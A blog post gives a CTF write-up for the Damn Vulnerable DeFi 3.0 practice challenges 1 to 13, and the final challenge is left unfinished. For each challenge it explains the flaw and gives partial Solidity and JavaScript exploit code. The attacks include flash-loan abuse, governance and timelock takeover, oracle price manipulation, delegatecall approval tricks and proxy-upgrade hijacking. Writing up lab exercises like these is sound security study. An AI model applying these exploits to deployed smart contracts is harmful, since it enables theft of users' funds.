---
layout: "post"
title: "WEB3! Damn Vulnerable DeFi 3.0 Write Up"
date: "2023-08-07 14:25:01"
date_gmt: "2023-08-07 14:25:01"
modified: "2023-08-07 14:25:01"
modified_gmt: "2023-08-07 14:25:01"
slug: "web3-damn-vulnerable-defi-3-0-write-up"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2023/08/07/web3-damn-vulnerable-defi-3-0-write-up/"
guid: "https://y4y.space/?p=470"
wordpress_id: 470
parent_id: 0
categories: ["Web3", "CTF Write Up"]
---

{% raw %}
## Resources

Challenge site: [https://www.damnvulnerabledefi.xyz/](https://www.damnvulnerabledefi.xyz/)

Foundry version of challenge: [https://github.com/StErMi/forge-damn-vulnerable-defi](https://github.com/StErMi/forge-damn-vulnerable-defi)

Original, hardhat version of challenge: [https://github.com/tinchoabbate/damn-vulnerable-defi](https://github.com/tinchoabbate/damn-vulnerable-defi)

## Prerequisite

Originally I wanted to put all the source and explain each line of code. Then I realized it would take really long to complete the notes/write-up. So I decided I would just talk about the key points in each level, and how I approved to solve the challenge.

Readers are expected to at least read the code of the challenge contracts and have a general good idea on how the contracts work.

## **Challenge #1 -** Unstoppable

### Prompt

There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To pass the challenge, make the vault stop offering flash loans.

You start with 10 DVT tokens in balance.

### Contracts & Key Functions

```solidity
contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower
```

- `onFlashLoan` : handles flashloan logics.
- `executeFlashLoan` : do flashloan.

```solidity
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626
```

- `totalAssets` : returns the total balance of address(this) for token `asset`
- `flashLoan` : do flashloan, checks if total supply and balanceBefore are the same, reverts if not.

### Analysis

The goal is to make the business logic halt. The best way is to mess up the states. Look for reverts that could be happening, we will find that in `flashLoan` , the contract uses `convertToShares` to represent the total supply. This changes when we send tokens to contract, because the supply stays the same, but assets increase. Note that, the assets are total balance of vault for token. This causes the total shares not equal to the balanceBefore variable, causing the contract to revert, in long term.

### Solution

Transfer some tokens to the vault address.

```javascript
await token.transfer(vault.address, ethers.utils.parseEther('1'));
```

## Challenge #2 - Naive receiver

### Prompt

There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

### Contracts & Key Functions

```solidity
contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender
```

- `flashLoan` : do flashloan, checks if receiver’s `onFlashLoan` callback is successful

```solidity
contract FlashLoanReceiver is IERC3156FlashBorrower
```

- `onFlashLoan` : callback function for `flashLoan` , pays back the amount + fee amount of ether to the pool.

### Analysis

`NaiveReceiverLenderPool.flashLoan()` calls `receiver.onFlashLoan` , and this can be anyone. We all know what’s gonna happen.

The goal is to drain **user**’s balance, not pool. We can setup a MITM contract, which borrows , 9 ethers, our MITM contract implements `IERC3156FlashBorrower` . When we receive flash loan, in our `onFlashLoan` function, we call `user.onFlashLoan` , we can set the amount and the fee values, we simply set the fee to 10 ethers, and amount to 0 ethers, the user will pay the pool 10 ethers, and we get to keep the rest 9 ethers.

1. We borrow 9 ethers, plus the 1 ether fee, we need to payback 10 ethers at the end.
2. The pool calls receiver’s `onFlashLoan` callback function, this will fallback to our evil contract.
3. Our evil contract calls user’s `onFlashLoan` function, and make the user pay the pool 10 ethers.
4. Since the loan has already been paid, we can keep the 9 ethers.

### Solution

In the MITM contract, call

```solidity
user.onFlashLoan(address(0x0), address(token), 0, 10 ether, "");
```

## Challenge #3 - Truster

### Prompt

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

### Contracts & Key Functions

```solidity
contract TrusterLenderPool is ReentrancyGuard
```

- `flashLoan` : it does `target.functionCall(data)`

### Analysis

Well…it allows anyone to call `flashLoan` , and we have control of `target` and `data` . Note we have to payback the loan tho. Since the low-level function call is initiated from the `target` , we can set `target` to token’s address, and the calldata will be `approve(address(player), token.balanceOf(pool))` . We payback the loan, and transfer all tokens out on pool’s behave as we have already let the pool approve us.

### Solution

In our evil contract, do things like the following:

```solidity
target = address(token);
data = abi.encodeWithSignature(
	"approve(address,uint256)",
	address(this),
	token.balanceOf(address(pool))
);
pool.flashLoan(..., target, data);
```

## Challenge #4 - **Side Entrance**

### Prompt

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

### Contracts & Key Functions

```solidity
contract SideEntranceLenderPool
```

- `deposit` : `balances[msg.sender] += msg.value;`
- `withdraw` : `SafeTransferLib.safeTransferETH(msg.sender, amount);`
- `flashLoan` : does this: `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();`

### Analysis

If a contract will somewhat call functions controlled by users, it mostly won’t end well.

Again, we need to payback the loans, but since it calls a callback function which is controlled by us, we can use the loan we have, while in the callback function, we deposit. Since the payback only checks if `balanceBefore == balanceAfter` , deposit is acting like a payback mechanic.

1. We call `flashLoan` , borrow 1000 ethers
2. The pool will call our evil contract which has callback function, with `msg.value = 1000 ethers`
3. In our callback function, we use the ethers we have borrowed, deposit those back to the pool.
4. Now the pool thinks we have 1000 ethers worth of balance, and at the end of `flashLoan` , the balance hasn’t changed, the pool thinks we have paid-back the loan.
5. We call `withdraw` to withdraw all the 1000 ethers.

### Solution

In our contract, we would have things like:

```solidity
execute() {
	pool.deposit(msg.value);
}

attack() external {
	pool.flashLoan(1000 ethers);
	pool.withdraw();
	player.call{}(value: 1000 ethers ); // to complete the level
}
```

## Challenge #5 - **The Rewarder**

### Prompt

There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

By the way, rumors say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?

### Contracts & Key Functions

```solidity
contract AccountingToken is ERC20Snapshot, OwnableRoles
```

- nothing special, some casual ERC20Snapshot implementation contract

```solidity
contract FlashLoanerPool is ReentrancyGuard
```

- `flashLoan` : does low-level call to `msg.sender` with function `receiveFlashLoan(uint256)`

```solidity
contract RewardToken is ERC20, OwnableRoles
```

- again, nothing special.

```solidity
contract TheRewarderPool
```

- `distributeRewards` : gets total deposits and `msg.sender` ’s deposit amount from the snapshot, and mints the token if `msg.sender` has deposited some amounts of tokens.

### Analysis

The prompt kinda gives it away. Hinting us to get a flashloan and try to get the reward from the pool. In `distrubuteRewards` function, it loads deposited amount from last snapshot, which is from the last round, if we want to get rewards, we would need to deposit in round A, then wait for 5 days to pass, and when a new round is coming, the function calls `_recordSnapshot()` , which refreshes the snapshot, and since we have deposited tokens, we are in for the reward distribution.

1. In hardhat or foundry, fast forward time by 5 days
2. Deploy our flashloan receiver contract, borrow a flashloan from the loan pool
3. In our `receiveFlashLoan` function, we deposit the borrowed tokens into the pool, and call `distributeRewards()` immediately. This will update the snapshot, and we will be able to get our reward. Then call `withdraw` to get deposited tokens back. Finally pays back the flashloan.
4. Transfer the rewards back to ourselves, and complete the level.

### Solution

First:

```javascript
await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
```

Then deploy a contract similar to this:

```solidity
contract FlashLoanReceiver{
	...
	function receiveFlashLoan(uint256 amount){
		pool.deposit(amount);
		pool.distributeRewards();
		pool.withdraw();
	}
}
```

## Challenge #6 - Selfie

### Prompt

A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.

### Contracts & Key Functions

```solidity
contract SelfiePool is ReentrancyGuard, IERC3156FlashLender
```

- `flashLoan` : does flashloan, and checks `receiver.onFlashLoan` callback function.
- `emergencyExit` : can only be called when `msg.sender == address(governance)` , this function transfers all its tokens to a receiver which is provided by caller.

```solidity
contract SimpleGovernance is ISimpleGovernance
```

- `queueAction` : lets anyone to propose an action, but the proposer has to have enough votes. Saves the action as a struct.
- `executeAction` : as the name suggests. Executes the action by doing a low-level call on target address which is specified in the action struct.
- `_hasEnoughVotes` : a private function, but the logic for checking if proposer has enough votes lies here. It checks if the balance from governance token’s last snapshot is more than half of the entire shares.

```solidity
contract DamnValuableTokenSnapshot is ERC20Snapshot
```

- `snapshot` : unfortunately, this function can be called by anyone. And it takes a new snapshot.

### Analysis

Our goal is to drain all tokens in the pool. The `emergencyExit` function seems to be just for the purpose. But, in order to call this function, we would need the `msg.sender` to be the governance contract. And the governance contract lets approved actions to be called. We can use the flashloan to get enough votes to propose a new action. The action will call `emergencyExit` ,and the beneficiary will be us.

1. Set up a helper contract, calls `pool.flashLoan()`
2. The callback will reach back to ourselves at `onFlashLoan()`
3. In the callback function:
    1. Take the snapshot
    2. Propose a new action which will call `pool.emergencyExit()` by `queueAction`
    3. Payback the flashloan otherwise the transaction will be reverted.
4. `executeAction` doesn’t have any permission constrains, we can just call it, and it will call `pool.emergencyExit` , and we will get all the tokens.

### Solution

Your helper contract should look like this:

```solidity
contract Helper is IERC3156FlashBorrower {
	...
	uint256 public id;

	function onFlashLoan(uint256 amount) {
		token.snapshot();
		bytes memory actionData = abi.encodeWithSignature(
				"emergenceExit(address)",
				player.address
		);
		id = governance.queueAction(pool.address, 42, actionData);
		token.transfer(address(pool), amount);
	}

	function drain() external {
		govrenance.executeAction(id);
	}
}
```

## Challenge #7 - Compromised

### Prompt

While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:

```http
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0xA732...A105`,`0xe924...9D15` and `0x81A5...850c`.

Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.

### Contracts & Key Functions

```solidity
contract Exchange is ReentrancyGuard
```

- `buyOne` : buy one NFT, the price is determined with the average value among the three oracles.
- `sellOne` : sell one NFT, and the price is determined the same way as above.

```solidity
contract TrustfulOracle is AccessControlEnumerable
```

- `postPrice` : sets the price of NFT, sender must be one of the three oracles.

```solidity
contract TrustfulOracleInitializer
```

- nothing important, only initializes the TrusufulOracle contract.

### Analysis

Personally, I don’t like this challenge at all. Took me really long time to realize what the prompt is hinting. It turns out the hex values provided in the prompt are the private keys to two of the oracle’s addresses.

With private keys, we can easily gain control of the two oracles, and then set prices. Since the total price is determined by the median of three oracles’ price. Once we have two, we basically can set the price to anything we want.

1. In ethers.js, recover the two accounts
2. Call `TrustfulOracle.postPrice()` on the behave of oracles, and set the price to 0.
3. Buy all tokens for free.

### Solution

The explanation above should be somewhat self-explanatory. To send transactions on another wallet’s behave, do this:

```javascript
await oracle.connect(compromised_oracle1).postPrice(0)
```

Then buy the tokens, but don’t forget, do it on player’s behave.

## Challenge #8 - Puppet

### Prompt

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old [Uniswap v1 exchange](https://docs.uniswap.org/contracts/v1/overview), currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.

### Contracts & Key Function

```solidity
contract PuppetPool is ReentrancyGuard
```

- `borrow` : our deposit needs to twice the amount we want to borrow. What a jerk.

### Analysis

The pool gets the price based on UniswapV1. In UniswapV1, constant product formula is used. This is to say that:

```text
Amount_X * Amount_Y = k
```

The price is determined where:

```ini
Price_X = Amount_Y / Amount_X
```

Basically saying, the more token X is in the pool, the less token X worth, makes sense, right? Imagine we swap many token X with token Y, this will the amount of token Y close to 0, and makes the price drops even further.

We have 1000 DVTs to begin with, if we swap 1000 DVTs to ETH, we will get around 9.9 ethers. And the new price would be `0.001 / 1010` , the calculation is not precise, but just to showcase the idea.

After our swap, DVT is basically worthless in UniswapV1Pool. Because the pool fetches UniswapV1 to calculate collateral, the amount we need to pay is close to zero.

1. `exchange.tokenToEthSwapInput(1000 ether, 0, block.timestamp + 1)`
2. `pool.borrow(100000 ether, player)`

### Solution

All actions can be done with ethers.js.

## Challenge #9 - Puppet V2

### Prompt

The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version!

Now they’re using a [Uniswap v2 exchange](https://docs.uniswap.org/contracts/v2/overview) as a price oracle, along with the recommended utility libraries. That should be enough.

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do.

### Contracts & Key Functions

```solidity
contract PuppetV2Pool
```

- `borrow` : pretty similar to the last one.

### Analysis

The ideas are similar. UniswapV2 and UniswapV1 doesn’t change much when it comes to price calculation, we can swap a huge amounts of DVTs with WETH, and if a single swap is not enough to make the DVT price low enough, we will do it in two, or three, or even more swaps.

1. `router.swapExactTokensForETH(10000 ether, 0, path, player, block.timestamp + 1)`
2. Now the DVT price is significantly lower, but still not enough, we need to lower it further. But we have used up all of our DVTs. That’s when we need to borrow some DVTs from the pool. `pool.borrow(100000 ether)`
3. Do a second swap: `router.swapExactTokensForETH(100000 ether, 0, path, player, block.timestamp + 1)`
4. Borrow the rest tokens as the current DVT price is low enough. `pool.borrow(900000 ether)`

### Solution

I found deploying a helper contract is helpful. Your contract should look like this:

```solidity
interface IUniswapV2Router02 {
	function swapExactTokensForETH(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external returns (uint[] memory amounts);
}

contract Helper {
	function attack() external {
		address[] memory path = new address[](2);
		path[0] = address(token);
		path[1] = address(weth);
		uint256 amountOut = IUniswapV2Router02(router).swapExactTokensForETH(
			10000 ether,
			0,
			path,
			address(this),
			block.timestamp + 1
		);

		uint256 collateral = pool.calculateDepositOfWETHRequired(100000 ether);
		token.approve(address(pool), collateral);
		pool.borrow(100000 ether);

		uint256 amountOut = IUniswapV2Router02(router).swapExactTokensForETH(
			100000 ether,
			0,
			path,
			address(this),
			block.timestamp + 1
		);

		uint256 collateral = pool.calculateDepositOfWETHRequired(900000 ether);
		token.approve(address(pool), collateral);
		pool.borrow(900000 ether);

		token.transfer(player, token.balanceOf(address(this));
	}
}
```

## Challenge #10 - Free Rider

### Prompt

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

### Contracts & Key Functions

```solidity
contract FreeRiderNFTMarketplace is ReentrancyGuard
```

- `buyMany` : buys many NFTs at once, calls `_buyOne` for each NFT purchase.
- `_buyOne` : buys one single NFT, checks if `msg.value >= price` , otherwise reverts. Also, it transfers NFT ownership, **then** send NFT’s price to owner.

```solidity
contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver
```

- `onERC721Received` : when this contract receives 6 NFTs, will transfer the reward to beneficiary, which is us, the player.

### Analysis

For some reasons, my exploit never worked in hardhat environment. It works in forge DVD.

There are two key loopholes in the market contract. First: it uses `msg.value` for all purchases of NFTs, this means we can buy many NFTs with the price of only one. Second: as I mentioned in the previous section, the function transfers the NFT to buyer, then pays the NFT price to the NFT owner. So we are the ones to actually receive payouts. This sounds great and all, but we only have 0.1 ethers, not even enough to buy a single NFT!

And as the prompt hinted, we can try to get a flashloan. If we look at the deployment scripts, we see that there are UniswapV2 contracts just out there for some reason. In UniswapV2, there is a utility called flash swap, basically does what flashloan does.

We can utilize the flashswap, get those NFTs and their payouts, then transfer our NFTs to the recovery contract and get rewards.

1. In our attacker contract: `pair.swap(30 ether, 0, address(this), "");`
2. This will let UniswapV2Pair to hit up back with callback: `uniswapV2Call` , in this callback function, we want to unwrap the WETH we get, and buy all NFTs. We can also transfer all those NFTs to the recovery contract once we have them. At the end of the callback function, we need to warp ethers and payback the loan.

### Solution

Again, the contract below is not finished, but your attacker contract should look like:

```solidity
contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
	...
	function uniswapV2Call(address, uint, uint, bytes calldata) external {
    weth.withdraw(weth.balanceOf(address(this)));
    uint256[] memory tokenIDs = new uint256[](6);
    for (uint i = 0; i < 6; i++) {
        tokenIDs[i] = i;
    }

    market.buyMany{ value: 15 ether }(tokenIDs);

    uint256 fee = (30 ether * 4) / 1000;
    weth.deposit{ value: (30 ether + fee) }();
    weth.transfer(address(pair), (30 ether + fee));

  }
	function attack() public {
    pair.swap(30 ether, 0, address(this), "1234");
	}

	function onERC721Received(address, address, uint256, bytes memory)
	  external
	  override
	  returns (bytes4) {
      return IERC721Receiver.onERC721Received.selector;
  }
}
```

Don’t forget to transfer NFTs to the recovery contract!

## Challenge #11 - Backdoor

### Prompt

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of [Gnosis Safe wallets](https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol). When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.

To make sure everything is safe and sound, the registry tightly integrates with the legitimate [Gnosis Safe Proxy Factory](https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol), and has some additional safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Your goal is to take all funds from the registry. In a single transaction.

### Contracts & Key Functions

```solidity
contract WalletRegistry is IProxyCreationCallback, Ownable
```

- `proxyCreated` : this is a callback function for `GnosisSafeProxyFactory` to call upon proxy creation. It does multiple checks, one of them is checking if initializer variable contains `GnosisSafe` ’s setup function’s selector. After all checks are passed, tokens are transferred to the proxy which is just created.

### Analysis

This levels testify on delegatecall. We first need to create proxies using `GnisisSafeProxyFactory` , then, with `createProxyWithCallback` , we are able to set initializer data as well as callback contract. The callback contract is certain going to be the wallet, but the initializer will be calldata to `GnosisSafe.setup` .

When the setup function is called, it will executes the data provided in the parameter, and does a delegatecall for proxy with the data.

Remember that when proxies are created, rewards are transferred to the proxies. When we let the delegate to call us with function like:

```solidity
function callback(address token, address recipient) external {
	IERC20(token).approve(recipient, 10 ether);
}
```

Normally, this would not work, because `msg.sender` is us, and it will approve the recipient to spend our tokens. But in delegatecalls, the `msg.sender` is not who really sends the transaction, and it looks at one level above, it’s like `msg.sender.sender` . When our callback function gets called, the actual `msg.sender` will be `GnosisSafe` , but the real caller will be `GnosisSafeProxy` .

1. Deploy our helper function, and create a proxy contract using `GnosisSafeProxyFactory.createProxyWithCallback()`
2. In the initializer parameter, we will call `GnosisSafe.setup()` , this function also takes in a calldata parameter which to be called later.
3. In the setup function, we set the target to ourselves, and the function to be `callback` . It will eventually approve us to spend proxy’s tokens.
4. Transfer proxy’s tokens to us, and do the same for the rest 3 beneficiaries.

### Solution

Important functions are here:

```solidity
function attack(address[] memory users, address player) public{
  for (uint i = 0; i < users.length; i++) {
    address[] memory owner = new address[](1);
    address user = users[i];
    owner[0] = user;

    GnosisSafeProxy proxy = factory.createProxyWithCallback(
      singleton,
      abi.encodeWithSignature(
        "setup(address[],uint256,address,bytes,address,address,uint256,address)",
        owner,
        1,
        address(this),
        abi.encodeWithSignature("callback(address,address,uint256)", address(token), address(this), 10 ether),
        address(0),
        address(0),
        0,
        address(0)
      ),
      1,
      wallet
    );

    token.transferFrom(address(proxy), player, 10 ether);
  }
}

function callback(address token, address spender, uint256 amount) external {
    IERC20(token).approve(spender, amount);
}
```

## Challenge #12 - Climber

### Prompt

There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).

The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.

On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.

On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.

To pass this challenge, take all tokens from the vault.

### Contracts & Key Functions

I switched to forge-DVD for this level, just FYI.

```solidity
contract ClimberTimelock is AccessControl
```

- `schedule` schedules an operation with targets, values, and calldata. This function can only be called by the `PROPOSER_ROLE` . The operation ready time is defined as follow: `uint64(block.timestamp) + delay`
- `getOperationState` returns the status of operation. If `op.readyAtTimestamp >= block.timestamp` then we say an operation is ready to be executed.
- `updateDelay` updates the delay for operation to be ready at.
- `getOperationId` returns the operation hash based on the parameters.
- `execute` executes the operation based on parameters, checks the status of operationId, is the operation is valid, will execute the low-level call. The function reverts when it finds out the operation is not ready to be executed, but it does the check at the end of the function.

```solidity
contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable
```

- `sweepFunds` takes all the fund from the vault, but can only be called by `SWEEPER_ROLE`

### Analysis

The goal is to take all the funds, and the `vault.sweepFunds()` lets us to do just that. The issue is, this function can only be called by sweeper, which according to the deployment scripts, is set to a random user which we mostly won’t compromise.

Another interesting function is `execute` in the Timelock contract, any function which lets you execute low-level function calls are worth to keep an eye on.

However, `execute` has a few constrains, too. We need to make sure the operation is set to be scheduled, this means we need to make sure operation’s ready time is at least equal to the current block timestamp to pass the check.

This leads us to find a way to set the delay of the operations. Like I mentioned in last section, in `execute` , low-level function calls are executed before the operation status check. Additionally, this function can be called by anyone. This allows us to use the low-level call to change the delay time, during `execute` call. After we changed the delay, we want to schedule the exact operation which are undergoing execution, this ensures the final bypass of the status check at the end of the function.

But, what do we want to get out of the `execute` function? You see, the vault is an UUPS contract. If we can upgrade the logic contract to a new implementation contract which we have total control of, we can do whatever we want as vault. Now, the issue is, how can we upgrade to to a new implementation? By reading the UUPS contract code, we see if we want to upgrade the proxy contract, we would need:

```solidity
function upgradeTo(address newImplementation) external virtual onlyProxy {
    _authorizeUpgrade(newImplementation);
    _upgradeToAndCallUUPS(newImplementation, new bytes(0), false);
}
```

And we see `_authorizeUpgrade` has a `onlyOwner` modifier. This means we want to be vault’s owner if we want to upgrade it. We also will find out that during deployment, Timelock is actually vault’s owner, and we can potentially call any functions with `msg.sender` being the Timelock contract. This means we can transfer the ownership of vault contract to ourselves, and we can proceed to upgrade the implementation!

1. construct an operation which does the following: `timelock.updateDelay(0)` , then `timelock.schedule(//operation parameters//)` , finally `timelock.transferOwnership()` . We can use a helper contract to schedule the operation for us. For example: `helper.help()` , with the function only does `timelock.schedule(parameters...)` . We also need to grant ourselves the `PROPOSER_ROLE` to schedule an operation.
2. Call `execute` and become owner of vault.
3. Create an evil implementation which provides a function to withdraw all tokens.
4. Upgrade the proxy to our evil implementation.
5. Withdraw all tokens from the new evil implementation.

### Solution

Some snippets of solution:

```solidity
address[] memory targets = new address[](4);
uint256[] memory values = new uint256[](4);
bytes[] memory data = new bytes[](4);

targets[0] = address(vaultTimelock);
targets[1] = address(evil);
targets[2] = address(vaultTimelock);
targets[3] = address(vault);

values[0] = 0;
values[1] = 0;
values[2] = 0;
values[3] = 0;

data[0] = abi.encodeWithSignature(
    "grantRole(bytes32,address)",
    keccak256("PROPOSER_ROLE"),
    address(evil)
);
data[1] = abi.encodeWithSignature("callback()");
data[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);
data[3] = abi.encodeWithSignature("transferOwnership(address)", address(evil));

vaultTimelock.execute(targets, values, data, "");
```

In your helper contract:

```java
function callback() external {
    address[] memory targets = new address[](4);
    uint256[] memory values = new uint256[](4);
    bytes[] memory dataElements = new bytes[](4);

    targets[0] = address(target);
    targets[1] = address(this);
    targets[2] = address(target);
    targets[3] = address(vault);

    values[0] = 0;
    values[1] = 0;
    values[2] = 0;
    values[3] = 0;

    dataElements[0] = abi.encodeWithSignature(
        "grantRole(bytes32,address)",
        keccak256("PROPOSER_ROLE"),
        address(this)
    );
    dataElements[1] = abi.encodeWithSignature("callback()");
    dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);
    dataElements[3] = abi.encodeWithSignature("transferOwnership(address)", address(this));

    target.schedule(
        targets,
        values,
        dataElements,
        ""
    );
}

function attack() external {
    EvilVault newImplementation = new EvilVault();

    vault.upgradeTo(address(newImplementation));
    EvilVault(address(vault)).withdraw(address(token), owner);

}
```

And the evil implementation:

```solidity
contract EvilVault is ClimberVault {
    constructor() {

    }

    function withdraw(address token, address receiver) external {
        IERC20(token).transfer(receiver, IERC20(token).balanceOf(address(this)));
    }
}
```

## Challenge #13 - Wallet Mining

### Prompt

There’s a contract that incentivizes users to deploy Gnosis Safe wallets, rewarding them with 1 DVT. It integrates with an upgradeable authorization mechanism. This way it ensures only allowed deployers (a.k.a. wards) are paid for specific deployments. Mind you, some parts of the system have been highly optimized by anon CT gurus.

The deployer contract only works with the official Gnosis Safe factory at `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B` and corresponding master copy at `0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F`. Not sure how it’s supposed to work though - those contracts haven’t been deployed to this chain yet.

In the meantime, it seems somebody transferred 20 million DVT tokens to `0x9b6fb606a9f5789444c17768c6dfcf2f83563801`. Which has been assigned to a ward in the authorization contract. Strange, because this address is empty as well.

Pass the challenge by obtaining all tokens held by the wallet deployer contract. Oh, and the 20 million DVT tokens too.

### Contracts & Key Functions

```solidity
contract AuthorizerUpgradeable is Initializable, OwnableUpgradeable, UUPSUpgradeable
```

- `can` returns the double dimension array of if the caller and the proxy address are legit.
- `upgradeToAndCall` upgrades the logic contract to a new implementation.

```solidity
contract WalletDeployer
```

- `drop` creates a new proxy using `GnosisSafeProxyFactory` , and if `can(msg.sender, address(proxy)` returns true, transfer tokens to `msg.sender` , otherwise, reverts the transaction.
- `can` does a bunch of assembly, but essentially make a function to `AuthorizzerUpgradeable.can()` and checks if the return value if zero using `staticcall()` .

### Analysis

This one is kinda hard. For starters, we know there are three address are hard-coded into the contract out of nowhere. The factory contract, masterCopy contract, and the ward address.

The trick here is, we can find those addresses on etherscan, and they are exactly a factory and masterCopy contract. Since in the hardhat network, no chainId is checked what-so-ever, this means we can replay a transaction that is from another chain network. With this idea, we can copy the raw transaction data, replay them in our local network, and deploy masterCopy and factory this way.

Another thing to be aware is despite we can replay transaction, we still need to ensure the nonce number are checked out.

For `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B` :

![](https://y4y.space/wp-content/uploads/2023/08/e59bbee78987.png?w=1024)

And for `0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F` :

![](https://y4y.space/wp-content/uploads/2023/08/e59bbee78987-1.png?w=1024)

We can go in depth, and find the correspond transactions when they are created. If we go down to the oldest transaction of the masterCopy contract, we find the transaction `0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3` . And by examining its state changes:

![](https://y4y.space/wp-content/uploads/2023/08/e59bbee78987-2.png?w=1024)

We see it’s deployed by `0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A` , and at nonce of 1. We can also get the raw transaction data here: [https://etherscan.io/getRawTx?tx=0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3](https://etherscan.io/getRawTx?tx=0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3)

It’s similar for the factory contract.

Once we have the raw transaction, we can try to re-create those two contracts on our local network. But, before we do this, we need to sure the nonce starts with 1 when we are creating masterCopy.

To make the nonce increase, we can simply transfer some ethers to the deployer’s address, like:

```javascript
await player.sendTransaction({
	to: 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A,
	value: ethers.utils.parseEther('1')
});
```

Then we do:

```javascript
await ethers.provider.sendTransaction(//masterCopy creation raw data//);
```

Now, we have masterCopy and factory contracts up. The next step is to think about where does the `DEPOSIT_ADDRESS` come from. If the address is created by factory, then its address can be determined.

In EVM, there are two opcodes for creating contracts: `CREATE` and `CREATE2` . Their key difference is how the address is evaluated.

```solidity
// CREATE
address = keccak256(address(deployer), nonce);

// CREATE2
address = keccak256(0xFF, sender, salt, bytecode);
```

In Uniswap, pool addresses are created using the `CREATE2` opcode. This way each pool’s address can be pre-determined.

We can brute-force the nonce for the factory contract to create the deposit address. For spoilers, the nonce is 43.

We can create a proxy contract using the factory, and have it under our control, and transfer all its token to us. But we still need to drain all wallet’s tokens.

